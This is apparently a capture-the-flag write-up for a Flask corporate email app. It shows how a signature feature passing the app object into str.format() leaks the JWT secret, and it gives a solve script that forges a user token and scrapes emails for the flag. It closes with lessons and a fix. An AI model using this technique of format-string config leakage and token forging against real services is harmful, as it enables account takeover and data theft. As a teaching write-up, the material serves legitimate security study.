01

Challenge Overview

CorpMail is a Flask-based internal corporate email web application. We're given access to the running instance and, after some poking, also receive the full source code. The goal is to read a confidential email sent from the admin account to mike.wilson containing the flag.

The application uses JWT tokens for session management, an SQLite database seeded with fake employees, and a signature templating feature in user settings.

‚ö° TL;DR

Abuse Python's str.format() in the email signature feature to leak the JWT secret, forge an admin token, then read the flag email as mike.wilson.

03

Vulnerability Analysis

The most critical piece of code lives in utils.py:

utils.py Python 
def format_signature(signature_template, username):
    now = datetime.now()
    try:
        return signature_template.format(
            username=username,
            date=now.strftime('%Y-%m-%d'),
            app=current_app   # ‚Üê Flask app context exposed!
        )
    except (KeyError, IndexError, AttributeError, ValueError):
        return signature_template

The function passes the entire Flask current_app object into Python's str.format() as the app keyword argument. This means any {app.X} expression in the signature template gets evaluated against the live application object ‚Äî including its config dictionary.

‚ö† Root Cause

str.format() allows arbitrary attribute traversal on any passed object. Since current_app is passed as app, an attacker can access app.config[JWT_SECRET] ‚Äî which holds the signing key for all session tokens.

Note that the exception handler catches KeyError, IndexError, AttributeError, and ValueError ‚Äî but not all traversal paths trigger these. The bracket notation app.config[JWT_SECRET] works because config is a dict-like object and str.format() handles [key] subscript access.

This is called a Server-Side Template Injection via str.format() ‚Äî a classic Python vulnerability distinct from Jinja2 SSTI but equally dangerous when application internals are exposed.

Forge an Admin JWT

03

Read the Flag Email as mike.wilson

The /admin/* prefix is blocked by a reverse proxy (403). Instead, forge a token as mike.wilson (non-admin) ‚Äî he received the flag email directly, so /email/<id> is accessible.

solve.py ‚Äî final exploit Python 
import jwt, requests, re
from datetime import datetime, timedelta

BASE_URL = "http://challenges.1pc.tf:49230"
SECRET   = "e5f3724dd1053111d4bc72f70d45129265866c171801ebbde6ed474485c838bb"

def make_token(user_id, username, is_admin=0):
    payload = {
        'user_id': user_id, 'username': username,
        'is_admin': is_admin,
        'exp': datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, SECRET, algorithm='HS256')

# mike.wilson is user_id=4 (seeded order: admin=1, john=2, jane=3, mike=4)
token   = make_token(4, 'mike.wilson')
cookies = {"token": token}

for eid in range(1, 16):
    r = requests.get(f"{BASE_URL}/email/{eid}", cookies=cookies)
    flags = re.findall(r'C2C\{[^}]+\}', r.text)
    if flags:
        print(f"[+] FLAG: {flags[0]}")
        break

06

Key Takeaways

This challenge is a great example of why str.format() should never be used on untrusted input ‚Äî it is not a safe templating engine. The danger is often underestimated compared to Jinja2 SSTI because it looks like simple string interpolation.

LessonDetail
str.format() is dangerous Never pass application internals like current_app into user-controlled format strings. Use explicit allowlists of safe values only.
Secrets should not live in config alone If the config object is reachable via any user-controlled path, the entire secret surface is exposed.
Proxy 403 ‚â† full protection Blocking /admin/* at the nginx level doesn't help when the same data is accessible via user-facing routes with a forged token.
JWT brute force is a red herring Cryptographically random secrets cannot be cracked. The real vulnerability was always the SSTI, not the JWT algorithm.
üîß Fix

Replace str.format() with explicit variable substitution using only a safe allowlist: signature.replace("{username}", username).replace("{date}", date_str). Never pass application objects into user templates.
